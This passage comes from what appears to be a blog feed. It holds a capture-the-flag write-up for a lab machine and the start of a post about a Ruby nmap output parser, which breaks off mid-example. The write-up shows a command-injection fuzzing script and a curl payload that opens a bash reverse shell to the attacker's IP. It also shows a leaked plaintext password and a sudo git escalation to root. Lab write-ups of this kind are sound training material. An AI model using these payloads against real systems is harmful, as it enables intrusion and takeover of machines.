&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://192.168.250.109/under_construction/forgot.php&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sc_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Get website cookie, token ...?
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;iso-8859-1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;special_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;special_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ss&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ss&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ss&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;email&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ss&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Trying payload: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We then execute the script as follow.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 params_brute.py OS-Command-Fuzzing.txt 
Trying payload: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;email&apos;&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;&apos;&amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/bin/cat%20/etc/passwd&amp;amp;quot;--&amp;amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Could not open input file: sendmail.php&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;127&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
...
Trying payload: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;email&apos;&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;&apos;|id&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;uid=33(www-data) gid=33(www-data) groups=33(www-data)&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;0&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a few seconds, we discover that the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;|id&lt;/code&gt; triggers &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; command on the other end.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;method-2---guessing&quot;&gt;&lt;strong&gt;Method 2 - Guessing&lt;/strong&gt;&lt;/h5&gt;
&lt;p&gt;The payload in the first method is not the only way. By guessing, we can also achieve Remote Code Execution (RCE).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.250.109/under_construction/forgot.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%0aid | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-20&lt;/span&gt;

&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
  ______ __  __          _____ _         _______     _______ _______ ______ __  __ 
 |  ____|  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;  |   /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;  |_   _| |       / ____&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;  / / ____|__   __|  ____|  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;  |
 | |__  | &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / |  /  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;   | | | |      | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___  &lt;span class=&quot;se&quot;&gt;\ \_&lt;/span&gt;/ / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___    | |  | |__  | &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / |
 |  __| | |&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;| | / /&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;  | | | |       &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;  / &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;  | |  |  __| | |&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;| |
 | |____| |  | |/ ____ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;_| |_| |____   ____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |  | |  ____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |  | |  | |____| |  | |
 |______|_|  |_/_/    &lt;span class=&quot;se&quot;&gt;\_\_&lt;/span&gt;____|______| |_____/   |_| |_____/   |_|  |______|_|  |_|
 

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Under Construction &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;

sendmail.php must receive the variable from the html form and send the message.

&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; For security reasons we are working to blacklist some characters &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;

//--&amp;gt;

&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;initial-access&quot;&gt;&lt;strong&gt;Initial Access&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Previously, we allocate the vulnerability leading to RCE. It’s now a simple task to get the call back.&lt;/p&gt;

&lt;p&gt;On our terminal, we execute:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.250.109/under_construction/forgot.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;bash+-c+&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;bash+-i+&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;%26+/dev/tcp/192.168.49.250/80+0&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;%261&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a bit, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; listener should catch the reverse shell at port 80 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.250] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.250.109] 39692
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;546&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@UC404:/var/www/html/under_construction&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;shell-as-brian&quot;&gt;&lt;strong&gt;Shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brian&lt;/code&gt;&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Moving around as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;, we disclose the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/backups/sendmail.php.bak&lt;/code&gt; reserving the credentials of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brian&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;span class=&quot;nv&quot;&gt;$connect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mysql_connect&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;brian&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;BrianIsOnTheAir789&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; or die&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Could not connect to database&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
mysql_select_db&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;uc404&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; or die&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mysql_error&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point, we simply SSH into the target as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brian&lt;/code&gt; with the newly obtained password.&lt;/p&gt;

&lt;h4 id=&quot;sudo-permission&quot;&gt;SUDO Permission&lt;/h4&gt;
&lt;p&gt;Poking around, we realize that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brian&lt;/code&gt; allows us to execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo /usr/bin/git ...&lt;/code&gt; command as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;brian@UC404:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;brian on UC404:
    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin

User brian may run the following commands on UC404:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this permission, we easily compromise the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;brian@UC404:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;git &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;config
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/bin/bash
root@UC404:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="ctf" /><category term="linux" /><category term="pg" /><summary type="html">Summary of Result We gain the initial access by exploiting the command injection vulnerability of a web application. We’ll then compromise brian - a local user via plain-text password stored in a backup file. As brian, we can execute a sudo command and successfully acquire root shell.</summary></entry><entry><title type="html">nmapextractor - A nmap parser</title><link href="https://jayngng.github.io/blog/nmapextractor-nmap-parser/" rel="alternate" type="text/html" title="nmapextractor - A nmap parser" /><published>2021-08-29T19:42:09+10:00</published><updated>2021-08-29T19:42:09+10:00</updated><id>https://jayngng.github.io/blog/nmapextractor---nmap-parser</id><content type="html" xml:base="https://jayngng.github.io/blog/nmapextractor-nmap-parser/">&lt;h1 id=&quot;general-information&quot;&gt;&lt;strong&gt;General Information&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmapextractor&lt;/code&gt; is a small project written in Ruby with the purposes of:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Inspecting &lt;em&gt;alive hosts&lt;/em&gt; from either &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; files or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; stream utilizing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipextractor&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Parsing &lt;em&gt;opened ports&lt;/em&gt; of an &lt;em&gt;alive host&lt;/em&gt; from either &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; files or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; stream utilizing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pextractor&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Download &lt;a href=&quot;https://github.com/jayngng/nmapextractor&quot;&gt;here.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let’s us demonstrate some feasibilities of the tools &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipextractor&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pextractor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-ipextractor---ip-extractor&quot;&gt;&lt;strong&gt;1. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipextractor&lt;/code&gt; - IP Extractor&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;general-information-1&quot;&gt;&lt;strong&gt;General information&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipextractor&lt;/code&gt; is employed to inspect alive hosts, it supports all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; file types and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; stream.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Help menu&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ipextractor
ipextractor - A nmap parsing tool

It is used to extract alive hosts &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a nmap file.

Usage: ipextractor &amp;lt;File Type&amp;gt; &amp;lt;Nmap File&amp;gt;|&amp;lt;Nmap Stream&amp;gt;

FILE TYPES:
 &lt;span class=&quot;nt&quot;&gt;-oX&lt;/span&gt; is xml nmap output. 
 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; is nmap output. 
 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; is grepable nmap output.
    
NOTE: 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FILE TYPE] is NOT required when file has 
 .nmap | .xml | .gnmap extension


EXAMPLES:
 ipextractor hosts.nmap
 ipextractor &lt;span class=&quot;nt&quot;&gt;-oX&lt;/span&gt; nmap_xml
 ipextractor &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap_scan.nmap
 nmap &lt;span class=&quot;nt&quot;&gt;-PE&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 192.168.0.0/24 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; - | ipextractor &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;example&quot;&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; grepable file.&lt;/strong&gt;
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ipextractor nmap/scan.gnmap 
172.16.10.1
172.16.10.11
172.16.10.19
172.16.10.20
172.16.10.37
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Similarly, we can also parse &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.nmap&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.xml&lt;/code&gt; file:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ipextractor nmap/scan.xml
172.16.10.1
172.16.10.11
172.16.10.19
172.16.10.20
172.16.10.37
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; from stream.&lt;/strong&gt;
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-PE&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 172.16.10.0/24 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; - | ipextractor &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt;
172.16.10.1
172.16.10.11
172.16.10.19
172.16.10.20
172.16.10.37
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The switch &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oN&lt;/code&gt; is an example, we can adjust it to be compatibe with other &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; file types, i.e. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oX&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oG&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For instance:&lt;/p&gt;
